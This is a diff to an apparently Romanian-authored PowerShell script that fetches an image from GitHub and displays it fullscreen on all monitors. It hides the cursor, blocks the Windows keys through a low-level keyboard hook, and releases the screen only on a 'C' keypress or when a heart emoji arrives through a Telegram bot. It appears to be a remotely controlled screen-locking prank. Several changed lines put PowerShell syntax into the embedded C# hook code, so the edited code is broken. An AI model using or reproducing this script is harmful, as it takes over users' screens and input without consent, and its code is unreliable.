@@ -1,4 +1,3 @@
-
 # URL-ul imaginii
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
@@ -45,12 +44,12 @@ function Start-Telegram-Listener {
                     $lastUpdateId = $update.update_id
                     $txt = $update.message.text
                     if ($txt -eq "❤️" -or $txt -like "*❤*") {
-                        [Environment]::Exit(0)
+                        [System.Windows.Forms.Application]::Exit()
                     }
                 }
             }
         } catch {}
-        Start-Sleep -Seconds 3
+        Start-Sleep -Seconds 2
     }
 }
 
@@ -94,10 +93,10 @@ function Block-And-MonitorKeys {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                     int vkCode = Marshal.ReadInt32(lParam);
                     if (vkCode == 0x43) {
-                        Environment.Exit(0);
+                        [System.Windows.Forms.Application]::Exit()
                     }
-                    if (vkCode == 0x5B || vkCode == 0x5C) {
-                        return (IntPtr)1;
+                    if (vkCode -eq 0x5B -or vkCode -eq 0x5C) {
+                        return [IntPtr]1
                     }
                 }
                 return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -122,6 +121,9 @@ function Show-FullScreenImage {
         $form.StartPosition = 'Manual'
         $form.Location = $screen.Bounds.Location
         $form.Size = $screen.Bounds.Size
+        $form.BackColor = 'Black'
+        $form.KeyPreview = $true
+        $form.Cursor = [System.Windows.Forms.Cursors]::None
 
         try {
             $img = [System.Drawing.Image]::FromFile($tempImagePath)
@@ -134,12 +136,13 @@ function Show-FullScreenImage {
         $pictureBox.Dock = 'Fill'
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
+
         $forms += $form
     }
 
     foreach ($form in $forms) { [void]$form.Show() }
-    [System.Windows.Forms.Application]::DoEvents()
-    Start-Telegram-Listener
+
+    Start-Job -ScriptBlock { Start-Telegram-Listener }
     [System.Windows.Forms.Application]::Run()
 }
 
